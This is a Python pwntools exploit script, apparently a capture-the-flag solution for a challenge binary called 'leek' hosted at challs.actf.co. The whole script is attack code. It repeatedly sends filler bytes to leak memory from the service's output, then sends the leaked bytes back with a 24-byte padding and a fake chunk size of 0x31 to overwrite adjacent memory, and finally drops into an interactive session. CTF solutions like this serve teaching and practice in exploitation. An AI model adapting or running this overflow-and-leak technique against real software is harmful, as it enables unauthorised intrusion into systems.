#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

# context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./leek')
		if debug:
			gdb.attach(s, gdbscript='''
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('challs.actf.co', 31310)

	return s


# elf = ELF('./leek')
# libc = ELF('libc.so.6')
s = conn()
p = 31*b'!'
p1 = 24*b'A'+p64(0x31)
for i in range(100): 
    s.sendlineafter(b'): ', p)
    l = s.recvuntil(b'\nS', timeout=1)[71:103]
    s.send(l + p1 + b'\n')
    print(i)
s.interactive()

